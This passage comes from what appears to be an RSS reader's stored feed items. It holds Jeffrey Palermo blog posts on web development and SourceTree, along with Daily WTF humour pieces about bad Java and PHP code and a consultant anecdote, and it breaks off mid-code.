src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=DMwn5E2Sdrk:51ubFFMrOJw:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/DMwn5E2Sdrk\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":897}}
{"k":"0000000082","o":"0000008956","v":"001"}
{"_id":898,"_uid":898,"_dt":1373729344425,"_s":"e9027d9de1a381cd33bdb542e656294f"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/yxCfJlp3sgU/","title":"Web development as we know it, is dead","published":{"$wrap":"$date","v":1362063037000,"h":"2013-02-28T14:50:37.000Z"},"starred":false,"read":false,"content":"<p>Web development as we know it, is dead.  We keep looking for the common runtime that can run everywhere.  We yearn (remember Java) for the platform that allows us the promise of “<a href=\"http://en.wikipedia.org/wiki/Write_once,_run_anywhere\">write once, run everywhere</a>”.  This, in the global sense, is a pipe dream.  My comments here are targeted for custom software that businesses rely on.  These are commonly referred to as business applications, or line of business applications.  The days of writing a business application for the web and expecting it to serve all users is over.  Only in a world where 99% of your users are using pretty much the same type of computer is this possible. (desktop/laptop computers – PCs/Macs)</p><p>I started web development in 1997 using Microsoft’s<a href=\"http://msdn.microsoft.com/en-us/library/ms525756(v=vs.90).aspx\">IDC/HTX</a>technology that ran on IIS on Windows NT 4.  Soon thereafter, Microsoft developed Active Server Pages (ASP), then .Net, then MVC, now Web API, and is now working on<a href=\"http://www.typescriptlang.org/\">TypeScript</a>as a way for C# programmers to develop JavaScript for HTML5 applications using classes, namespaces, and some typing help (see my<a href=\"https://github.com/jeffreypalermo/FizzBuzz-TypeScript\">TypeScript FizzBuzz example</a>)</p><p><img style=\"float: left; margin: 0px 5px 0px 0px; display: inline\" align=\"left\" src=\"http://www.dvdyourmemories.com/wp-content/uploads/2012/06/Floppy-Disc.jpg\" width=\"166\" height=\"111\" />For custom software, the web was a HUGE breakthrough in a world that saw software packages as things you deployed via floppy disk, and then CD ROM, and installed on every single computer on which it was used.  For companies developing and deploying custom software to a large number of users, this was a huge pain.  Remember that some of the first proponents of browser-based custom software and business applications were from corporate I/T departments that were bearing the burden of deploying and updating desktop applications.</p><p><img style=\"float: right; display: inline\" align=\"right\" src=\"http://harbor-pc.com/shop/images/black_17_inch_monitor.jpg\" width=\"141\" height=\"122\" />Over the last decade, web applications for business have dominated.  This was a big new capability: run the software without installing it.  We can’t discount this.  It was huge.  The computing form factor, however, was unchanged.  It was the desktop.  In 2000, you were lucky if you had a 17 inch CRT monitor.  By 2003, 19 inch was becoming more popular, so early web applications were build with 1024x768 target resolution. </p><p><a href=\"https://o.twimg.com/1/proxy.jpg?t=FQQVBBgpaHR0cHM6Ly90d2l0cGljLmNvbS9zaG93L2xhcmdlL2MwZjZ6dy5qcGcUBBYAEgA&s=TXyyMJ1hag6VbKR6hnSYSP_EdqbTjAPSxZ5RznpGxu8\"><img style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: left; padding-top: 0px; padding-left: 0px; margin: 0px 5px 0px 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" align=\"left\" src=\"https://o.twimg.com/1/proxy.jpg?t=FQQVBBgpaHR0cHM6Ly90d2l0cGljLmNvbS9zaG93L2xhcmdlL2MwZjZ6dy5qcGcUBBYAEgA&s=TXyyMJ1hag6VbKR6hnSYSP_EdqbTjAPSxZ5RznpGxu8\" width=\"165\" height=\"123\" /></a>Fast forward to 2013, and if a web application doesn’t have a responsive design, we scoff because it’s difficult to use it on the smaller web browsers found in mobile devices.  HTML5 represents a huge leap forward in capabilities for web browsers everywhere.  HTML5 is the next incarnation of the “write once, run everywhere” dream.  The same pipe dream.  The problem isn’t in the “write once”.  The problem is in the “run everywhere”.  And don’t get me wrong, I love HTML5.  This is my real license plate.</p><p>With HTML5, we try to target HTML5, CSS3, and JavaScript (<a href=\"http://www.ecmascript.org/\">ES5</a>) in order to make one codebase function the same across all types of computers.  This isn’t possible because our code is being interpreted radically different across browsers on Windows, Mac, Linux, iOS, Android, and WP8.  Because the runtimes are different, we find ourselves using libraries like jQuery to on-the-fly adapt to platform differences.  We look to things like<a href=\"http://lesscss.org/\">LESS</a>to help us decompose our CSS that is bloated with browser/platform specific tags.  Because of all these issues caused by differing runtimes, we sometimes find it easier just to tell our business users: “just run Chrome.  It will save us a lot of money”.  Essentially, that puts us right back in the boat of choosing a runtime platform.</p><p>I’m discussing the world of business software here, not the consumer space where even a wrong choice of color will cause users (and revenue) to be lost. </p><p><img style=\"float: right; margin: 0px 0px 0px 5px; display: inline\" align=\"right\" src=\"https://lh3.googleusercontent.com/-hh04Ff7Jn7s/UQLADa2bhgI/AAAAAAAAA34/09mPisyNocs/w497-h373/317047_467084600007090_1848203976_n.jpg\" width=\"185\" height=\"127\" />Web development, as we know it, is dead.  It had a great run.  Applications were greatly simplified with only 2 tiers to manage: the application, and the database.  We “told” ourselves that we were still 3-tier because the browser was the 3rd tier, but we had little control over that. </p><p>The new world and the new face of web development for the business world of custom software is one where the application runs on the web server and is merely a set of APIs.  No presentation.  Talk about forcing separation of concerns (SoC).  This new world is one where we must recognize that the shape of computers has radically shifted and that clients are, once again, fragmented.  We will not be able to write one client application to serve all people or all platforms.  The new web applications of this decade run headless on the web server and merely interact with multiple clients.  We will be on the hook for developing as many of these clients as we determine is necessary to serve the business need.  And these different computing form factors will likely be differently designed.</p><p>For instance, an HTML5 client is likely going to be common for many scenarios including seldom-used features like maintenance screens (it’s really easy to do these here).  On the other hand, for people on the go, they will need to perform some functions from wherever over a 3G/LTE connection.  For this, the business needs to select iOS/Android/WP8 for the target platform.  This mobile app with then just talk to the application running on the server.</p><p><img style=\"float: left; margin: 0px 5px 0px 0px; display: inline\" align=\"left\" src=\"http://4.bp.blogspot.com/-E8yqPJ-ykoo/ULWuF64LCmI/AAAAAAAAAYE/nq0CgdRP9ac/s640/google-glasses.jpeg\" width=\"147\" height=\"83\" /><img style=\"float: right; margin: 0px 0px 0px 5px; display: inline\" align=\"right\" src=\"https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQEtt7EmlYCW5NgywHChsx1VY90HwjPumkWtmVtnVOuKJ1C3NN61g\" width=\"143\" height=\"86\" />Soon, we will need to develop some client apps that run on the upcoming wristwatch from Apple and the eyeglasses (Glass) from Google.  And with TVs becoming so cheap, it is just a matter of time before it makes more sense to write a client for a display in the office instead of hooking a full PC into it (we’ll control the UI with the TV remote).</p><p>Yes, an era of web development has passed.  It will certainly have a long tail, but existing web systems need to expose their functions with<a href=\"http://jeffreypalermo.com/blog/what-if-we-modeled-every-user-action-as-the-passing-of-a-document/\">HTTP APIs</a>in order to support clients for necessary platforms.  We will never, as an industry, stop chasing the dream of “write once, run everywhere”.  After all, it makes too much sense.  But as long as the definition of “everywhere” keeps changing, we will be forever chasing.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=yxCfJlp3sgU:OQZaYfoixfo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=yxCfJlp3sgU:OQZaYfoixfo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=yxCfJlp3sgU:OQZaYfoixfo:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/yxCfJlp3sgU\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":898}}
{"k":"0000000082","o":"0000002932","v":"001"}
{"_id":899,"_uid":899,"_dt":1373729344433,"_s":"ad554c163e36d2f8f7b55bdccce10caf"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/X9hxbS165kg/","title":"Move over TortoiseGit, welcome SourceTree","published":{"$wrap":"$date","v":1368762405000,"h":"2013-05-17T03:46:45.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Move-over-TortoiseGit-welcome-SourceTree_13C2E/image_2.png\"><img title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; float: right; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" border=\"0\" alt=\"image\" align=\"right\" src=\"http://jeffreypalermo.com/files/media/image/Windows-Live-Writer/Move-over-TortoiseGit-welcome-SourceTree_13C2E/image_thumb.png\" width=\"452\" height=\"372\" /></a>Since around 2005, I, and teams I’ve led, have been using the Tortoise flavor of source control clients. <a href=\"http://tortoisesvn.net/\">TortoiseSVN</a>,<a href=\"http://tortoisehg.bitbucket.org/\">TortoiseHg</a>, and<a href=\"https://code.google.com/p/tortoisegit/\">TortoiseGit</a>.  Each came with the command-line client as well for specific use cases, but most of the time, we used the Windows explorer shell integration.  To this day I’m using TortoiseGit with<a href=\"https://github.com/\">GitHub</a>,<a href=\"https://bitbucket.org/\">BitBucket</a>, and<a href=\"https://tfs.visualstudio.com/en-us/home/news/2013/jan-30/#git support\">Team Foundation Service+Git</a>.  It works well with all of them.  I’m not sure why it took so long for me to figure out that Atlassian has a Git and Hg client called<a href=\"http://sourcetreeapp.com/\">SourceTree</a>.  Here is what it looks like, and it seem to work seamlessly with my existing repositories and working copies.  In addition, it integrates diffs very well so that it’s obvious right off the bat what has changed in the file. </p><p>One feature that SourceTree does not provide is explorer shell integration so that I can right-click on the repository working copy and perform functions directly from there.  It will remain to be seen how often I reach for TortoiseGit with the new slick interface that SourceTree has.  I’m not sure, but I don’t think it will take long to see.</p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=X9hxbS165kg:3J2sLzbVP_s:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=X9hxbS165kg:3J2sLzbVP_s:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=X9hxbS165kg:3J2sLzbVP_s:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/X9hxbS165kg\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":899}}
{"k":"0000000082","o":"0000002297","v":"001"}
{"_id":900,"_uid":900,"_dt":1373729344437,"_s":"0fcc1b5f52eb46cd3fffc9c210efb471"}
{"subscription":{"$wrap":"$oid","v":26},"link":"http://feeds.jeffreypalermo.com/~r/jeffreypalermo/~3/rv9a4SrHePc/","title":"Announcing Party with Palermo: DevTeach 2013 edition!","published":{"$wrap":"$date","v":1368655381000,"h":"2013-05-15T22:03:01.000Z"},"starred":false,"read":false,"content":"<p>Jean-Rene Roy has graciously helped to sponsor a Party with Palermo at<a href=\"http://devteach.com\">DevTeach</a>in Toronto.  If you are not yet signed up for the conference, please head on over to<a href=\"http://www.devteach.com\">www.devteach.com</a>.</p><p>If you have already signed up, make sure to RSVP for Party with Palermo on 5/29 at 6:30PM.  Also on the schedule for that evening is a<a href=\"http://dotnetrocks.com\">.Net Rocks</a>show just for the 10th anniversary of the DevTeach conference!</p><p><a href=\"http://pwpdevteach2013.eventbrite.com/\"><font size=\"5\"><strong>RSVP now!</strong></font></a></p><p> </p><p><a href=\"http://devteach.com\"><img style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; padding-right: 0px\" border=\"0\" src=\"http://blogs.msdn.com/cfs-filesystemfile.ashx/__key/communityserver-blogs-components-weblogfiles/00-00-01-43-80-metablogapi/8838.logo_2D00_deveach_2D00_Large_5F00_4D6E476E.gif\" width=\"273\" height=\"125\" /></a><a href=\"http://dotnetrocks.com\"><img style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; padding-right: 0px\" border=\"0\" src=\"http://www.netcastia.com/galleries/podcast_dnr.jpg\" width=\"184\" height=\"184\" /></a></p><div class=\"feedflare\"><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=rv9a4SrHePc:W12jAooRpKo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.jeffreypalermo.com/~ff/jeffreypalermo?a=rv9a4SrHePc:W12jAooRpKo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/jeffreypalermo?i=rv9a4SrHePc:W12jAooRpKo:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/jeffreypalermo/~4/rv9a4SrHePc\" height=\"1\" width=\"1\"/>","author":"Jeffrey Palermo","_id":{"$wrap":"$oid","v":900}}
{"k":"0000000082","o":"0000003327","v":"001"}
{"_id":901,"_uid":901,"_dt":1373729346093,"_s":"7c2ab95cd6bbccdad40d9aaa6b091018"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Success-Overcompensates-for-Failure.aspx","title":"Error'd: Success Overcompensates for Failure","published":{"$wrap":"$date","v":1373623200000,"h":"2013-07-12T10:00:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Brian</strong>found that SharePoint considers a“Success” an error worth noting. Oh, Brian, we know. We know.<br/><img src=\"http://img.thedailywtf.com/images/remy/0712_sp_success.jpg\" title=\"Sharepoint Error Successful\" /></p><p><em>World of Tanks</em>is apparently a pretty great MMO, but it looks like<strong>Jaakko</strong>won’t be joining them any time soon.<br/><img src=\"http://img.thedailywtf.com/images/remy/0712_wot_copy.jpg\" title=\"8.6GB of 5.4GB, 661787 hours remaining\" /></p><p>While we’re on the subject of games,<strong>Sean</strong>’s Steam client downloaded a new update… for a server-side update that doesn’t require a client update?<br/><img src=\"http://img.thedailywtf.com/images/remy/0712_steam_update.jpg\" title=\"Maybe it downloaded the Steam server software? Maybe were all steam servers now!\" /></p><p><strong>Pete</strong>recently joined the“Drivers Alert Network”. I don’t know what that is, but I take this email to mean they’re protecting database drivers against SQL injection attacks.<br/><img src=\"http://img.thedailywtf.com/images/remy/0712_dan_injection.jpg\" title=\"DAN DAN DAN DAAAAAAANNNNNNN - Beethoven\" /></p><p>While we’re on the subject of cars,<!-- LOOK AT THESE SEGUES. DON'T YOU LOVE MY SEGUES? IT'S THE FUTURE OF TRAVEL -->Best Buy’s“Vehicle Fit” guide is ready to help you see if your new stereo will fit in your old car. No matter<em>how old</em>your car may be.<br/><img src=\"http://img.thedailywtf.com/images/remy/0712_bestbuy_years.jpg\" title=\"Actually, I should have put this picture right under the Steam icon. Because a really old car would be Steam powered, right? Right? Cmon, Im dyin up here.\" /></p><p>Finally, the city of Manchester is apparently compensating for something.<strong>John</strong>sends us this:<br/><img src=\"http://img.thedailywtf.com/images/remy/0712_manchester_bsod.JPG\" title=\"Long, Hard, BSOD\" /></p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=SYode-8sO_M:huEvo19uH4g:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/SYode-8sO_M\" height=\"1\" width=\"1\"/>","author":"Remy Porter","_id":{"$wrap":"$oid","v":901}}
{"k":"0000000082","o":"0000004241","v":"001"}
{"_id":902,"_uid":902,"_dt":1373729346483,"_s":"30c6f64758de601990b59bcd82d71933"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Stringing-a-Replacement.aspx","title":"CodeSOD: Stringing a Replacement","published":{"$wrap":"$date","v":1373539500000,"h":"2013-07-11T10:45:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Philip</strong>inherited a large Java application. It was the sort of application that needed to solve a clear business problem, so the original programmer started by building his own“template engine”, to simplify the process of generating output.</p><p>A template engine needs a simple way to do string replacements, but unfortunately, Java doesn’t<a href=\"http://docs.oracle.com/javase/6/docs/api/java/lang/String.html\">offer a String class with a variety of“replace” methods for different situations</a>. No, this Architect had to invent this wheel, using nothing but used chewing gum and his own wits.</p><link rel=\"stylesheet\" href=\"http://yandex.st/highlightjs/7.3/styles/default.min.css\"><script src=\"http://yandex.st/highlightjs/7.3/highlight.min.js\"></script><script>hljs.initHighlightingOnLoad();</script><!-- Oh, look, we've gone back to dropping in a JavaScript-based syntax highlighter. Certain RSS-readers were complaining about the pile-o-spans. Certain TDWTF readers were complaining about how copy-pasted-blocks of formatted source code were offensive to them. Now a different group can complain about JavaScript. We live to serve. --><pre><code>public class FunctionLibrary {public static String replaceAll(String input, String toRepalce,String replacement) {return StringUtil.replaceAll(input, toRepalce, replacement);}}</code></pre><p>Ah, the power of object<span onclick=\"cornify_add();return false;\" title=\"click me!\">orientation</span><script type=\"text/javascript\" src=\"http://www.cornify.com/js/cornify.js\"></script>. Talk about adherence to the“single responsibility principle”! But wait, what does StringUtil do?</p><pre><code>public class StringUtil {public static String replaceAll(String aReceiver, String anOldString, String aNewString) {int tmpIndex;int tmpLastIndex = 0;StringBuffer tmpResult;int tmpLength;if (null == aReceiver) {return null;}if ((null == anOldString) || (null == aNewString)) {return aReceiver;}tmpLength = anOldString.length();if (aReceiver.length()&lt; 1) {if (tmpLength&lt; 1) {return aNewString;}return\"\";}if (tmpLength&lt; 1) {tmpResult = new StringBuffer();tmpResult.append(aNewString);tmpResult.append(aReceiver);return tmpResult.toString();}tmpIndex = aReceiver.indexOf(anOldString, 0);if (tmpIndex&lt; 0) {return aReceiver;}tmpResult = new StringBuffer();while (tmpIndex&gt; -1) {tmpResult.append(aReceiver.substring(tmpLastIndex, tmpIndex));tmpResult.append(aNewString);tmpIndex += tmpLength;tmpLastIndex = tmpIndex;tmpIndex = aReceiver.indexOf(anOldString, tmpIndex);}if (tmpLastIndex&lt; aReceiver.length()) {tmpResult.append(aReceiver.substring(tmpLastIndex));}return tmpResult.toString();}}</code></pre><!-- Building this kind of receiver without the appropriate permits is likely to get you a call from the BATFE - hey, like 3 people will actually get this comment --><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=XkuumfPNL_k:UvD5r8OJf_E:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/XkuumfPNL_k\" height=\"1\" width=\"1\"/>","author":"Remy Porter","_id":{"$wrap":"$oid","v":902}}
{"k":"0000000082","o":"0000006098","v":"001"}
{"_id":903,"_uid":903,"_dt":1373729346487,"_s":"28e7af11bc07eaa328e8c1ea49e11872"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/To-Con-and-Insult.aspx","title":"To Con and Insult","published":{"$wrap":"$date","v":1373453100000,"h":"2013-07-10T10:45:00.000Z"},"starred":false,"read":false,"content":"<p>“Well, you know, this’ll be easier when you guys need support from us,” Bob told<b>Peter</b>, tugging at the calendar tacked to his cube wall.</p><p>From his seat on Bob’s empty file cabinet, Peter blinked.“Wow. I’m already a‘you guy?’”</p><p>Bob laughed disarmingly.“We built the network it’s installed on. It makes total sense.”</p><p>“You’re not running up against our non-compete?” Peter asked.</p><p>“No, man. We’re‘consultants’ now- totally different gig.” Bob turned back to add in a whisper,“and making<i>twice</i>the money! Lunch is on an expense account, by the way. Want to come to the steakhouse with us?”</p><p>Peter couldn’t fault Bob, especially not in the age when most employers discarded entire divisions like empty bottles of Evian. Still, in a way Peter felt like<i>he</i>was being left to sink or swim, not the company.</p><p>“Who came up with this idea?” he couldn’t help asking.“You or them?”</p><p>Bob sighed and looked down at Peter, in more senses than one.“Look, it’s not important. Hang in there, man. Maybe one of these days, you’ll get to do the same thing.”</p><p>Instead of developing in-house— too expensive— Peter’s company had contracted ConsultPro to implement a SharePoint core to unify dozens of their business applications. The project had lasted over a year, long enough for facades to melt away. The “strategic partnership” morphed from a collaboration of equals to a nimble parasite feeding off a dim- and slow-witted host. Not only was ConsultPro raking in monstrous hourly fees for its “specialized expertise,” it was also poaching three of the company’s engineers.</p><p>Peter wasn’t bitter. His chief responsibility lay in network account administration, so it wasn’t surprising that ConsultPro hadn’t come at him with the magical Wand of Consultant. However, there would be lots of knowledge transfer and shared responsibility until replacements arrived, cutting into all the work the department already had to do. Peter was also backup support for ConsultPro’s new solution, and had to familiarize himself with its underpinnings. He read up on documentation, played in the test environment, and handled the smaller tasks that primary support didn’t have time for. Meanwhile, Bob and his cohorts ascended to the land where money hemorrhaged upon those who dressed the most basic observations in the fanciest terms amid the swankest soirees.</p><p>The new system had some minor hiccups, as new systems do. It went live, and users acclimated. All went well for several months. Management toasted themselves for hiring outside help and reducing the Engineering budget, freeing up company resources to better focus on core strategies— like management bonuses. Perhaps the company didn’t need so many developers and support reps after all—</p><p>—and then, a major crash paralyzed everything. No one could log into the SharePoint portal. Thousands of users lost access to the apps they needed to do business. Peter’s CEO placed a frantic call to ConsultPro. Within an hour, Bob and the other two poached engineers returned to their former workplace and secreted themselves away in the biggest conference room on Peter’s floor.</p><p>Peter wasn’t primarily responsible, but decided to drop in on Bob and his old coworkers.“Hey! How’s it going?”</p><p>“Hi.” None of them managed more than that. A tension normally reserved for bomb disarmament choked the air out of the room.</p><p>“Um…” Peter grasped for something to say.“Anything I can help with?”</p><p>Bob ran a hand over his thinning hair, sighing and muttering.“It’s been two hours and we haven’t figured this out. You better clear out of here. It’s really complex, we’d probably bore you.”</p><p>Peter peered over Bob’s shoulder, at the error message on his laptop.“It could be that the security log’s full. Have you checked the application’s internal registry?”</p><p>The consultants in the room glanced up with a shot, questioning looks on their faces.</p><p>Peter walked Bob to the proper registry key.“This should be a 1, not a 4. It does that when the security log is full and has failed to be cleared and saved properly. Run the script<code>save-and-empty-seclog</code>, that should take care of it.”</p><p>Stunned, Bob nevertheless complied. Within minutes, everything was up and running again.</p><p>“How did you know that?” one of the other consultants asked, astonished.</p><p>“It’s in the documentation,” Peter said.“The same documentation<i>you</i>released to<i>us</i>. So this is why you get twice the pay I get?”</p><p>Peter shrugged, and left before any of them replied.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=c9XYP_C9kn4:uUqSY1_N7rg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/c9XYP_C9kn4\" height=\"1\" width=\"1\"/>","author":"Ellis Morning","_id":{"$wrap":"$oid","v":903}}
{"k":"0000000082","o":"0000012798","v":"001"}
{"_id":904,"_uid":904,"_dt":1373729346494,"_s":"84c44bbce9db0b7cd1d004a2d4554a82"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Epoch-Fail.aspx","title":"CodeSOD: Epoch Fail","published":{"$wrap":"$date","v":1373366700000,"h":"2013-07-09T10:45:00.000Z"},"starred":false,"read":false,"content":"<p>One of<strong>Michael</strong>'s employer's clients wanted a system to catalog and retrieve security videos. The resulting product was partly written in C++, partly written in PHP. The code is like poetry...really, really bad poetry.</p><p>One day, the client complained that the dates and times weren't being recorded right. Michael took a look in the database and double-checked the UNIX timestamps of a few on the web page. He confirmed that yes - they were recorded just fine.<i>Surely the client must have been imagining things</i>, Michael thought as he closed the bug as 'couldn't reproduce'.</p><p>However, that didn't satisfy the client - they insisted that he take another look, but this time at a specific video. Sure enough, he found that despite his earlier checking, the date was indeed wrong. At first, Michael suspected the bug was a result of the system correcting for UTC or daylight savings twice or something, but the videos were off by different amounts; an hour earlier here, two hours later there, and only in the evening. All the videos taken in the morning were fine.</p><p>The fact that only a few videos were impacted explained why he couldn't find the issue before, but when Michael finally found the problem part of the code, he had to wonder if<i>HE</i>was imagining things.</p><pre><span style='color:#5f5035; background:#ffffe8; '>&lt;?php</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>function</span><span style='color:#000000; background:#ffffe8; '>getTimeFromISODateTime</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$date</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>list</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$day</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$time</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#400000; background:#ffffe8; '>split</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#0000e6; background:#ffffe8; '>\" \"</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$date</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>list</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$min</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$sec</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#400000; background:#ffffe8; '>split</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#0000e6; background:#ffffe8; '>\":\"</span><span style='color:#808030; background:#ffffe8; '>,</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$time</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>if</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>></span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#008c00; background:#ffffe8; '>12</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#800080; background:#ffffe8; '>{</span><span 